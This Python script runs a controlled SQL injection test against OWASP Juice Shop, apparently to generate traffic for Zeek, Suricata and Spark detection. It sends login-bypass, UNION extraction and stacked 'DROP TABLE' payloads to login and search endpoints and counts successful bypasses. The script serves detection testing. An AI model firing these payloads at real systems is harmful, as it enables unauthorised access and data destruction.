#!/usr/bin/env python3
"""
Controlled SQL Injection (SQLi) Scenario against OWASP Juice Shop.
Injects standard SQLi test patterns into login and search endpoints.
Observed by: Zeek (http.log SQL keywords), Suricata
Detected by: Spark Structured Streaming & Suricata signature matching
"""

import os
import time
import requests

TARGET_HOST = os.getenv("TARGET_HOST", "localhost")
TARGET_PORT = int(os.getenv("TARGET_PORT", 3000))
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

SQLI_PAYLOADS = [
    ("' OR 1=1--", "Authentication bypass tautology"),
    ("admin@juice-sh.op'--", "Direct administrator comment-out bypass"),
    ("' UNION SELECT 1, 'admin', 'password'--", "Union-based data extraction probe"),
    ("1' or '1' = '1", "Standard boolean evasion"),
    ("'; DROP TABLE test;--", "Stacked statement probe")
]

def run_sqli_probe(delay: float = 0.2):
    print(f"\n[!] INITIATING CONTROLLED SQL INJECTION (SQLi) TEST against {BASE_URL}...")
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (SQLi-Audit-Tool/1.0)"
    }
    
    bypasses = 0
    for idx, (payload, desc) in enumerate(SQLI_PAYLOADS):
        # 1. Login endpoint test
        login_url = f"{BASE_URL}/rest/user/login"
        body = {"email": payload, "password": "dummy_password"}
        try:
            r = requests.post(login_url, json=body, headers=headers, timeout=2.0)
            if r.status_code == 200:
                bypasses += 1
                print(f"  [{idx+1}/{len(SQLI_PAYLOADS)}] POST /rest/user/login payload='{payload}' -> HTTP {r.status_code} [CRITICAL: Auth Bypass Succeeded! - {desc}]")
            else:
                print(f"  [{idx+1}/{len(SQLI_PAYLOADS)}] POST /rest/user/login payload='{payload}' -> HTTP {r.status_code} [Attempt Handled]")
        except Exception as e:
            print(f"  [{idx+1}/{len(SQLI_PAYLOADS)}] POST /rest/user/login -> Error: {e}")
            
        # 2. Search query parameter probe
        search_url = f"{BASE_URL}/rest/products/search?q={requests.utils.quote(payload)}"
        try:
            r = requests.get(search_url, timeout=2.0)
            print(f"      GET /rest/products/search?q=... -> HTTP {r.status_code}")
        except Exception as e:
            pass
            
        time.sleep(delay)
        
    print(f"[+] SQLi scenario completed: {bypasses} payload(s) bypassed authentication.")
    print(f"[*] Telemetry transmitted to Zeek & Suricata for threat classification.")
    return bypasses

if __name__ == "__main__":
    run_sqli_probe()
